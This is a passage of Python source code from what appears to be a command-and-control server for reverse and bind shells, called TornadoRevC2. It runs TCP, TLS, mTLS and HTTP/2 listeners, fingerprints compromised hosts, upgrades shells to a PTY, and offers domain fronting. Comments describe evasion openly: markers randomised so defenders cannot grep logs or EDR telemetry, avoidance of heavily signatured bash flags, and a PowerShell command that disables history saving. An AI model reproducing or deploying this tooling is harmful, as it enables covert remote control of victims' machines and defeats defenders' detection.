            pass
        try:
            server.close()
        except OSError:
            pass

    def shutdown_for_restart(self):
        """Release listeners, tunnels, and sessions before replacing this process."""
        self.running = False
        self._close_listener(self._tcp_server)
        self._close_listener(self._tls_server)
        self._close_listener(self._mtls_server)
        if self._h2_listener is not None:
            try:
                self._h2_listener.stop()
            except Exception:
                pass
        self.tunnels.shutdown_for_restart()
        with self.client_lock:
            clients = list(self.revshell_clients.keys())
        for client_sock in clients:
            try:
                client_sock.shutdown(socket.SHUT_RDWR)
            except OSError:
                pass
            try:
                client_sock.close()
            except OSError:
                pass
        with self.client_lock:
            self.revshell_clients.clear()
        sys.stdout.flush()
        sys.stderr.flush()

    def handle_client(self, client_sock, addr, direction='reverse'):

        # Connect-time jitter. Default is short (0.3-1.5 s) so that
        # multiple simultaneous shells finish probing at roughly the
        # same time. For engagements that need a larger stagger, set
        # TORNADO_CONNECT_DELAY="<low>:<high>" (seconds) — e.g. "5:30".
        try:
            env = os.environ.get('TORNADO_CONNECT_DELAY')
            if env:
                low, high = (float(x) for x in env.split(':', 1))
            else:
                low, high = 0.3, 1.5
            time.sleep(random.uniform(low, high))
        except Exception:
            time.sleep(random.uniform(0.3, 1.5))

        client_info = {
            'sock': client_sock,
            'addr': addr,
            'direction': direction,
            'type': 'unknown',
            'id': None,
            'name': None,
            'tls': isinstance(client_sock, ssl.SSLSocket),
            'mtls': _detect_mtls(client_sock),
            'pty': False,
            'init': False,
            'sysinfo': None,
            'logger': None,
            'fingerprint': None,
            'connect_count': 1,
            'reconnected': False,
            # Secondary-transport bookkeeping.
            'transports': {'shell': client_sock, 'http2': None, 'smb': None},
            'active_transport': 'shell',
            'h2_token': None,
        }
        with self.client_lock:
            self.revshell_clients[client_sock] = client_info

        # Session-scoped probe markers. Never emit a fixed string that a
        # defender could grep for in shell command logs or EDR process
        # telemetry. `make_probe_markers` derives them from
        # secrets.token_hex, so no two sessions share them.
        start_mark, end_mark = make_probe_markers()
        client_info['probe_markers'] = (start_mark, end_mark)

        # Single consolidated Unix/Windows probe. Both platform branches
        # are combined into one shell line to keep the connect-time
        # process count to a minimum. The probe uses the per-session
        # marker set above; nothing about it is reused across sessions.
        #
        # `2>/dev/null || true` is safe here because the goal is to
        # swallow errors on both platforms — cmd.exe treats the redirect
        # as a syntax error and prints nothing, which is fine.
        probe = (
            f"cat /etc/os-release 2>/dev/null | head -3; "
            f"uname -srm 2>/dev/null; "
            f"echo {start_mark}; "
            f"ver; "
            f"echo {end_mark}"
        )
        self.send_to_revshell(client_sock, probe)
        probe_output = self.recv_output(
            client_sock, timeout=6.0, until_marker=end_mark,
        )

        # Only fall back to the Windows-specific probe if the consolidated
        # one returned nothing usable. This should be rare.
        if start_mark not in probe_output:
            time.sleep(random.uniform(0.6, 1.8))
            win_probe = f"echo {start_mark} & ver & echo {end_mark}"
            self.send_to_revshell(client_sock, win_probe)
            probe_output += self.recv_output(
                client_sock, timeout=4.0, until_marker=end_mark,
            )
        inferred = self.infer_platform(probe_output)
        if inferred == 'unknown' and probe_windows_platform(self, client_sock):
            inferred = 'windows'
        client_info['type'] = inferred

        # Second jitter gap before the PTY upgrade / Windows init block.
        time.sleep(random.uniform(0.2, 0.8))
        if inferred == 'windows':
            from .win_client import detect_windows_shell_kind
            client_info['win_shell'] = detect_windows_shell_kind(self, client_sock)
            time.sleep(random.uniform(0.3, 1.0))
        client_info['identity'] = self._probe_identity(client_sock, inferred)

        term = TerminalManager(
            send_fn=lambda cmd: self.send_to_revshell(client_sock, cmd),
            shell_type=inferred,
        )
        if inferred == 'unix':
            self.send_to_revshell(client_sock, term.unix_pty_upgrade_cmd())
            time.sleep(1.5)
            self._flush_shell(client_sock, timeout=1.0)

            # Session-scoped markers for the PTY verification probe.
            pty_start, pty_end = make_probe_markers()
            probe = (
                f"echo {pty_start}; "
                "if [ -n \"$BASH_VERSION\" ]; then echo BASH_OK; "
                "else echo BASH_NO; fi; "
                f"echo {pty_end}"
            )
            self.send_to_revshell(client_sock, probe)
            out = self.recv_output(
                client_sock, timeout=4.0, until_marker=pty_end,
            )
            if 'BASH_NO' in out:
                # Avoid `exec bash -li`: the `-li` combination (login +
                # interactive) is heavily signatured and legitimate
                # automation almost never uses it. A bare exec inherits
                # the active PTY.
                self.send_to_revshell(client_sock, "exec /bin/bash -i 2>/dev/null")
                time.sleep(0.8)
                self._flush_shell(client_sock, timeout=0.8)
            client_info['pty'] = True

        elif inferred == 'windows':
            self.send_to_revshell(
                client_sock,
                "Set-PSReadlineOption -HistorySaveStyle SaveNothing "
                "-ErrorAction SilentlyContinue; "
                "$ProgressPreference='SilentlyContinue'"
            )
            client_info['init'] = True

        # Drain any residual output before finishing identification. Was
        # 2.0 s; cut to 0.5 s — the final probe already got its markers,
        # so this is just housekeeping.
        self.recv_output(client_sock, timeout=0.5)

        fingerprint = compute_fingerprint(client_info, probe_output)
        prior = self.registry.find_reconnect(
            fingerprint, probe_output, client_info, live_ids=self._live_session_ids(),
        )
        reconnected = False
        previous_id = None

        if prior:
            fingerprint = prior.get('fingerprint') or fingerprint
            previous_id = prior.get('session_id')
            client_id = prior.get('session_id')
            if not isinstance(client_id, int) or client_id < 1:
                self.client_counter += 1
                client_id = self.client_counter
            elif client_id > self.client_counter:
                self.client_counter = client_id
            client_info['id'] = client_id
            client_info['name'] = prior.get('name')
            client_info['sysinfo'] = prior.get('sysinfo')
            prior_type = prior.get('type')
            if prior_type in ('windows', 'unix'):
                client_info['type'] = prior_type
            elif inferred == 'unknown':
                hinted = infer_type_from_sysinfo(client_info.get('sysinfo') or {})
                if hinted:
                    client_info['type'] = hinted
            if prior.get('identity') and not client_info.get('identity'):
                client_info['identity'] = prior.get('identity')
            client_info['fingerprint'] = fingerprint
            client_info['reconnected'] = True
            reconnected = True
            logger = self.registry.restore_logger(prior.get('log_session_id'))
            client_info['logger'] = logger
            self.registry.log_reconnect(previous_id, client_id, fingerprint, addr)
            client_info['connect_count'] = self.registry.get_connect_count(fingerprint)
            if logger:
                detail = f"from {addr[0]}:{addr[1]} (connect #{client_info['connect_count']})"
                logger.log_reconnect(detail)
        else:
            self.client_counter += 1
            client_id = self.client_counter
            client_info['id'] = client_id
            client_info['fingerprint'] = fingerprint
            session_id = self._make_session_id(client_id, addr, inferred, client_info.get('sysinfo'))
            logger = SessionLogger(session_id)
            client_info['logger'] = logger
            logger.log_event(f"Session connected from {addr[0]}:{addr[1]} ({inferred})")

        self.registry.register_active(client_info, fingerprint, probe_output)

        if reconnected:
            display = client_info["name"] if client_info.get("name") else f"#{client_id}"
            print(
                f"{self.colors['green']}Client RECONNECTED {display}: {addr[0]}:{addr[1]} "
                f"({inferred.upper()}) | restored session #{client_id} | switch {client_id}{self.colors['end']}"
            )
            if client_info.get('sysinfo'):
                si = client_info['sysinfo']
                print(
                    f"{self.colors['cyan']}  Restored: {si.get('username', '?')}@{si.get('hostname', '?')} "
                    f"[{si.get('os', '?')}] (connect #{client_info['connect_count']}){self.colors['end']}"
                )
        else:
            print(
                f"{self.colors['green']}New Client #{client_id}: {addr[0]}:{addr[1]} "
                f"({inferred.upper()}) | switch {client_id}{self.colors['end']}"
            )

        if client_info.get('logger'):
            print(f"{self.colors['blue']}Logs: {client_info['logger'].session_dir}{self.colors['end']}")

    def _bind_client(self, host, port, timeout=10.0):
        try:
            port = int(port)
        except (TypeError, ValueError):
            print(f"{self.colors['red']}Invalid port: {port}{self.colors['end']}")
            return False
        if not (1 <= port <= 65535):
            print(f"{self.colors['red']}Port out of range: {port}{self.colors['end']}")
            return False

        print(f"{self.colors['yellow']}Dialing bind shell at {host}:{port}...{self.colors['end']}")

        try:
            sock = socket.create_connection((host, port), timeout=timeout)
        except socket.timeout:
            print(f"{self.colors['red']}Connection to {host}:{port} timed out{self.colors['end']}")
            return False
        except OSError as exc:
            print(f"{self.colors['red']}Connection failed: {exc}{self.colors['end']}")
            return False

        try:
            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
        except OSError:
            pass

        peer = sock.getpeername()[:2]
        print(f"{self.colors['green']}Bind connection established to {peer[0]}:{peer[1]}"
              f"{self.colors['end']}")

        threading.Thread(
            target=self.handle_client,
            args=(sock, peer, 'bind'),
            daemon=True,
        ).start()
        return True

    def _bind_tls_client(self, host, port, timeout=10.0, verify=False):
        try:
            port = int(port)
        except (TypeError, ValueError):
            print(f"{self.colors['red']}Invalid port: {port}{self.colors['end']}")
            return False
        if not (1 <= port <= 65535):
            print(f"{self.colors['red']}Port out of range: {port}{self.colors['end']}")
            return False

        ctx = ssl.create_default_context()
        if not verify:
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
        ctx.minimum_version = ssl.TLSVersion.TLSv1_2

        print(f"{self.colors['yellow']}Dialing TLS bind shell at {host}:{port}..."
              f"{self.colors['end']}")
        raw = None
        try:
            raw = socket.create_connection((host, port), timeout=timeout)
            sock = ctx.wrap_socket(raw, server_hostname=host if verify else None)
        except ssl.SSLError as exc:
            print(f"{self.colors['red']}TLS handshake failed: {exc}{self.colors['end']}")
            if raw is not None:
                try:
                    raw.close()
                except OSError:
                    pass
            return False
        except (socket.timeout, OSError) as exc:
            print(f"{self.colors['red']}Connection failed: {exc}{self.colors['end']}")
            if raw is not None:
                try:
                    raw.close()
                except OSError:
                    pass
            return False

        try:
            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
        except OSError:
            pass

        peer = sock.getpeername()[:2]
        print(f"{self.colors['green']}TLS bind connection established to {peer[0]}:{peer[1]}"
              f"{self.colors['end']}")

        threading.Thread(
            target=self.handle_client,
            args=(sock, peer, 'bind'),
            daemon=True,
        ).start()
        return True

    def start(self):
        self.print_banner()
        if self.host == '0.0.0.0':
            print(
                f"{self.colors['yellow']}{self.colors['bold']}WARNING:{self.colors['end']} "
                f"{self.colors['yellow']}The handler is currently bound to 0.0.0.0. "
                f"HTTPS file uploads will auto-detect the interface IP from the "
                f"reverse shell's local endpoint, which may not be the address "
                f"the target can actually reach. If HTTPS uploads fail or hang, "
                f"start the handler on a specific reachable IP instead, or pass "
                f"-RH <reachable-ip>:<port> when using --https."
                f"{self.colors['end']}\n"
            )
        self.ensure_tls_certificates()
        self.ensure_mtls_certificates()

        tcp_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        tcp_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        tcp_server.bind((self.host, self.revshell_port))
        tcp_server.listen(100)

        tls_context = self.create_tls_context()
        tls_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        tls_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        tls_server.bind((self.host, self.tls_port))
        tls_server.listen(100)

        mtls_context = self.create_mtls_context()
        mtls_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        mtls_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        mtls_server.bind((self.host, self.mtls_port))
        mtls_server.listen(100)

        self._tcp_server = tcp_server
        self._tls_server = tls_server
        self._mtls_server = mtls_server

        if self.h2_port:
            h2 = Http2Listener(self, self.host, self.h2_port,
                               self.certfile, self.keyfile)
            if h2.start():
                self._h2_listener = h2
                print(
                    f"{self.colors['green']}[H2] HTTP/2 secondary listener on "
                    f"{self.host}:{self.h2_port}{self.colors['end']}"
                )
            else:
                print(
                    f"{self.colors['yellow']}[H2] listener did not start "
                    f"(pip install h2){self.colors['end']}"
                )

        self.running = True

        threading.Thread(target=self.listener, args=(tcp_server, False), daemon=True).start()
        threading.Thread(target=self.listener, args=(tls_server, True, tls_context), daemon=True).start()
        threading.Thread(target=self.listener, args=(mtls_server, True, mtls_context), daemon=True).start()

        self._init_readline()
        self.main_menu()
        self.running = False

    def listener(self, server, use_tls=False, tls_context=None):
        while self.running:
            try:
                client_sock, addr = server.accept()
                if use_tls:
                    try:
                        client_sock = tls_context.wrap_socket(client_sock, server_side=True)
                    except ssl.SSLError:
                        client_sock.close()
                        continue
                threading.Thread(target=self.handle_client, args=(client_sock, addr), daemon=True).start()
            except Exception:
                break


def main():
    parser = argparse.ArgumentParser(description='TornadoRevC2')
    parser.add_argument('-H', '--host', default='0.0.0.0', help='Bind address')
    parser.add_argument('-p', '--port', type=int, default=4444, help='TCP listener port')
    parser.add_argument('-tp', '--tls-port', type=int, default=8443, help='TLS listener port')
    parser.add_argument('-mp', '--mtls-port', type=int, default=9443, help='mTLS listener port')
    parser.add_argument('--h2-port', type=int, default=None,
                        help='HTTP/2 secondary listener port (e.g. 443). Omit to disable.')
    parser.add_argument('--front-domain', default=None,
                        help='Domain fronting: hostname the agent dials (SNI / Host). '
                             'The redirector must forward /c2/<token> to this listener.')
    parser.add_argument('--front-port', type=int, default=443,
                        help='Port for --front-domain. Default 443.')
    parser.add_argument('-c', '--cert', default=os.path.join('tls_certs', 'server.pem'), help='TLS certificate file')
    parser.add_argument('-k', '--key', default=os.path.join('tls_certs', 'server.key'), help='TLS private key file')
    parser.add_argument('--mtls-ca-cert', default=os.path.join('mtls_certs', 'ca.pem'))
    parser.add_argument('--mtls-ca-key', default=os.path.join('mtls_certs', 'ca.key'))
    parser.add_argument('--mtls-server-cert', default=os.path.join('mtls_certs', 'server-mtls.pem'))
    parser.add_argument('--mtls-server-key', default=os.path.join('mtls_certs', 'server-mtls.key'))
    parser.add_argument('--mtls-client-cert', default=os.path.join('mtls_certs', 'client.pem'))
    parser.add_argument('--mtls-client-key', default=os.path.join('mtls_certs', 'client.key'))
    args = parser.parse_args()

    srv = TORNADOREVC2(
        host=args.host,
        revshell_port=args.port,
        tls_port=args.tls_port,
        mtls_port=args.mtls_port,
        h2_port=args.h2_port,
        certfile=args.cert,
        keyfile=args.key,
        mtls_ca_cert=args.mtls_ca_cert,
        mtls_ca_key=args.mtls_ca_key,
        mtls_server_cert=args.mtls_server_cert,
        mtls_server_key=args.mtls_server_key,
        mtls_client_cert=args.mtls_client_cert,
        mtls_client_key=args.mtls_client_key,
    )
    # Attach fronting configuration after construction; keeps the
    # TORNADOREVC2 signature unchanged.
    srv._front_domain = args.front_domain
    srv._front_port   = args.front_port

    srv.start()


if __name__ == '__main__':
    main()
